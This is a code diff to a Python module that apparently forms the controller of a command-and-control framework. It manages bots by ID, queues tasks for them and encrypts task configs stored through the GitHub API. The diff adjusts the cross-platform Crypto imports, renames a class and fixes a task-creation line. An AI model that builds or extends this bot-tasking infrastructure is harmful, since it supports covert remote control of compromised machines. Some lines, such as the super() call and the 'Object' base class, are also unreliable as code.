@@ -3,10 +3,19 @@ import os
 import random
 import string
 import time
+import sys
 
-from commander.thirdparty.Crypto import Random
-from commander.thirdparty.Crypto.PublicKey import RSA
-from commander.thirdparty.Crypto.Cipher import AES, PKCS1_OAEP
+try:
+    import Crypto
+except ImportError:
+    if sys.platform == 'win32':
+        from commander.thirdparty.win.Crypto import Random
+        from commander.thirdparty.win.Crypto.PublicKey import RSA
+        from commander.thirdparty.win.Crypto.Cipher import AES, PKCS1_OAEP
+    else:
+        from commander.thirdparty.unx.Crypto import Random
+        from commander.thirdparty.unx.Crypto.PublicKey import RSA
+        from commander.thirdparty.unx.Crypto.Cipher import AES, PKCS1_OAEP
 
 from commander.lib.githubapi import GitHubAPI
 from commander.lib.database import init_db
@@ -70,11 +79,11 @@ class DBManager(object):
         pass
 
 
-class CommandControler(GitHubAPI, DBManager):
+class CommandBase(GitHubAPI, DBManager):
 
     def __init__(self, dbf='../data.db', gtoken=None, guser=None, gpwd=None,
                  grepo=None, gbranch='master'):
-        super(CommandControler, self).__init__(
+        super(CommandBase, self).__init__(
             self, dbf=dbf, gtoken=gtoken, guser=guser,
             gpwd=gpwd, grepo=grepo, gbranch=gbranch)
         self.init_command()
@@ -297,7 +306,7 @@ class CommandControler(GitHubAPI, DBManager):
     def create_task(self, botid, name, module, Type, **settings):
         taskid = os.urandom(8).hex()
         task = dict(TaskID=taskid, BotID=botid, Name=name,
-                    Module=module, params)
+                    Module=module, params=settings['params'])
 
     def put_task_config(self, config, taskid, plain=False):
         content = config if plain else self.encrypt(config, self.sys_private_key)
@@ -416,4 +425,4 @@ class Task(Object):
 
 
 if __name__ == '__main__':
-    c = GHControler()
+    cb = CommandBase()
